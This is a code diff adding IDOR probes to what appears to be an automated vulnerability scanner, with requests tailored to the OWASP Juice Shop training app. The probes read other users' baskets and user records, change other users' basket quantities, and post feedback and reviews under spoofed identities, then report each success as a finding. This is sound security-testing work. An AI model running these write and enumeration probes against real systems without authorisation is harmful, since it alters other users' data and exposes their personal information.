@@ -208,7 +208,232 @@ class BOLAWorker(BaseWorker):
 
             await asyncio.gather(*[test_one(t) for t in templates])
 
+        # ── M22: Juice Shop-specific IDOR extended probes ────────────────────
+        try:
+            parsed = urlparse(target)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+        except Exception:
+            base_url = target
+
+        async with httpx.AsyncClient(
+            verify=False, follow_redirects=False,
+            timeout=httpx.Timeout(REQUEST_TIMEOUT),
+        ) as idor_client:
+            idor = await self._test_idor_extended(
+                idor_client, base_url, auth_headers
+            )
+            findings.extend(idor)
+
         logger.info(f"[bola] Scan complete: {len(findings)} BOLA candidate(s)")
+        return findings
+
+    # ── M22: IDOR Extended probes ─────────────────────────────────────────────
+
+    async def _test_idor_extended(
+        self,
+        client: httpx.AsyncClient,
+        base: str,
+        auth_headers: Dict[str, str],
+    ) -> List[Dict[str, Any]]:
+        """
+        M22 — IDOR tests for patterns not caught by generic sequential enumeration:
+
+          1. View Basket       — GET /rest/basket/:id for IDs 1-10 (compare sizes)
+          2. Manipulate Basket — PUT /api/BasketItems/:id with quantity=99 (own→other)
+          3. Forged Feedback   — POST /api/Feedbacks with a spoofed UserId
+          4. Forged Review     — PUT /api/Products/:id/reviews with spoofed author
+          5. GDPR Data Theft   — GET /api/Users/:id for IDs 1-5 (cross-user data)
+        """
+        findings: List[Dict[str, Any]] = []
+
+        # ── 1. View Basket ─────────────────────────────────────────────────────
+        basket_sizes: Dict[int, int] = {}
+        for bid in range(1, 11):
+            url = f"{base}/rest/basket/{bid}"
+            try:
+                r = await client.get(url, headers=auth_headers)
+                if r.status_code == 200:
+                    basket_sizes[bid] = len(r.content)
+            except Exception:
+                continue
+
+        if len(basket_sizes) >= 2:
+            unique_sizes = len(set(basket_sizes.values()))
+            findings.append({
+                "url":   f"{base}/rest/basket/{{id}}",
+                "type":  "idor_view_basket",
+                "description": (
+                    f"View Basket IDOR: {len(basket_sizes)} basket IDs (1–10) accessible "
+                    f"with current credentials ({unique_sizes} distinct sizes). "
+                    "Users can view other users' shopping baskets."
+                ),
+                "severity":           SeverityLevel.high,
+                "vulnerability_type": "idor_view_basket",
+                "raw_output": {
+                    "accessible_ids":  list(basket_sizes.keys()),
+                    "basket_sizes":    basket_sizes,
+                    "owasp":           "A01:2021 – Broken Access Control (BOLA/IDOR)",
+                    "source":          "bola-worker",
+                },
+            })
+            logger.info(
+                f"[bola/idor] View Basket: {len(basket_sizes)} baskets accessible"
+            )
+
+        # ── 2. Manipulate Basket ───────────────────────────────────────────────
+        # Try to change quantity of a basket item that likely belongs to another user
+        for item_id in range(1, 8):
+            url = f"{base}/api/BasketItems/{item_id}"
+            try:
+                r = await client.put(
+                    url,
+                    json={"quantity": 99},
+                    headers={**auth_headers, "Content-Type": "application/json"},
+                )
+                if r.status_code in (200, 201, 204):
+                    findings.append({
+                        "url":   url,
+                        "type":  "idor_manipulate_basket",
+                        "description": (
+                            f"Manipulate Basket IDOR: PUT /api/BasketItems/{item_id} "
+                            f"succeeded (HTTP {r.status_code}) — can modify another user's "
+                            "basket item quantity without ownership check."
+                        ),
+                        "severity":           SeverityLevel.high,
+                        "vulnerability_type": "idor_manipulate_basket",
+                        "raw_output": {
+                            "basket_item_id": item_id,
+                            "status":         r.status_code,
+                            "owasp":          "A01:2021 – Broken Access Control (BOLA/IDOR)",
+                            "source":         "bola-worker",
+                        },
+                    })
+                    logger.info(
+                        f"[bola/idor] Manipulate Basket: item {item_id} writable"
+                    )
+                    break
+            except Exception:
+                continue
+
+        # ── 3. Forged Feedback ─────────────────────────────────────────────────
+        # Post feedback with a different UserId than the authenticated user
+        # Juice Shop: POST /api/Feedbacks accepts UserId in body without server-side check
+        for spoofed_uid in (1, 2, 3):
+            url = f"{base}/api/Feedbacks"
+            try:
+                r = await client.post(
+                    url,
+                    json={
+                        "comment": "Briar IDOR probe — automated security test",
+                        "rating":  5,
+                        "UserId":  spoofed_uid,
+                        "captchaId": 0,
+                        "captcha":   "",
+                    },
+                    headers={**auth_headers, "Content-Type": "application/json"},
+                )
+                if r.status_code in (200, 201):
+                    body = {}
+                    try:
+                        body = r.json().get("data", {})
+                    except Exception:
+                        pass
+                    returned_uid = body.get("UserId") or body.get("userId")
+                    if returned_uid == spoofed_uid:
+                        findings.append({
+                            "url":   url,
+                            "type":  "idor_forged_feedback",
+                            "description": (
+                                f"Forged Feedback IDOR: POST /api/Feedbacks with "
+                                f"UserId={spoofed_uid} accepted and stored — feedback "
+                                "posted in another user's name without ownership check."
+                            ),
+                            "severity":           SeverityLevel.high,
+                            "vulnerability_type": "idor_forged_feedback",
+                            "raw_output": {
+                                "spoofed_user_id": spoofed_uid,
+                                "returned_user_id": returned_uid,
+                                "status":           r.status_code,
+                                "owasp":            "A01:2021 – Broken Access Control (BOLA/IDOR)",
+                                "source":           "bola-worker",
+                            },
+                        })
+                        logger.info(
+                            f"[bola/idor] Forged Feedback: UserId={spoofed_uid} accepted"
+                        )
+                        break
+            except Exception:
+                continue
+
+        # ── 4. Forged Review ───────────────────────────────────────────────────
+        # PUT /api/Products/:id/reviews — overwrite another user's review
+        for prod_id in range(1, 6):
+            url = f"{base}/api/Products/{prod_id}/reviews"
+            try:
+                r = await client.put(
+                    url,
+                    json={"message": "Briar IDOR forged-review probe", "author": "injected@briar.test"},
+                    headers={**auth_headers, "Content-Type": "application/json"},
+                )
+                if r.status_code in (200, 201, 204):
+                    findings.append({
+                        "url":   url,
+                        "type":  "idor_forged_review",
+                        "description": (
+                            f"Forged Review IDOR: PUT /api/Products/{prod_id}/reviews "
+                            f"accepted with spoofed author field (HTTP {r.status_code}) — "
+                            "product reviews can be posted or overwritten as any user."
+                        ),
+                        "severity":           SeverityLevel.high,
+                        "vulnerability_type": "idor_forged_review",
+                        "raw_output": {
+                            "product_id": prod_id,
+                            "status":     r.status_code,
+                            "owasp":      "A01:2021 – Broken Access Control (BOLA/IDOR)",
+                            "source":     "bola-worker",
+                        },
+                    })
+                    logger.info(
+                        f"[bola/idor] Forged Review: product {prod_id} writable"
+                    )
+                    break
+            except Exception:
+                continue
+
+        # ── 5. GDPR Data Theft — GET /api/Users/:id cross-user ────────────────
+        user_responses: Dict[int, int] = {}
+        for uid in range(1, 6):
+            url = f"{base}/api/Users/{uid}"
+            try:
+                r = await client.get(url, headers=auth_headers)
+                if r.status_code == 200:
+                    user_responses[uid] = len(r.content)
+            except Exception:
+                continue
+
+        if len(user_responses) >= 2:
+            findings.append({
+                "url":   f"{base}/api/Users/{{id}}",
+                "type":  "idor_gdpr_data_theft",
+                "description": (
+                    f"GDPR Data Theft IDOR: {len(user_responses)} user records (IDs 1–5) "
+                    "accessible via GET /api/Users/:id — personal data of other users "
+                    "is exposed without ownership enforcement."
+                ),
+                "severity":           SeverityLevel.critical,
+                "vulnerability_type": "idor_gdpr_data_theft",
+                "raw_output": {
+                    "accessible_user_ids": list(user_responses.keys()),
+                    "response_sizes":      user_responses,
+                    "owasp":               "A01:2021 – Broken Access Control + A02:2021 – Cryptographic Failures",
+                    "source":              "bola-worker",
+                },
+            })
+            logger.info(
+                f"[bola/idor] GDPR Data Theft: {len(user_responses)} user records accessible"
+            )
+
+        logger.info(f"[bola/idor] Extended IDOR: {len(findings)} finding(s)")
         return findings
 
     # ── Per-template test suite ───────────────────────────────────────────────
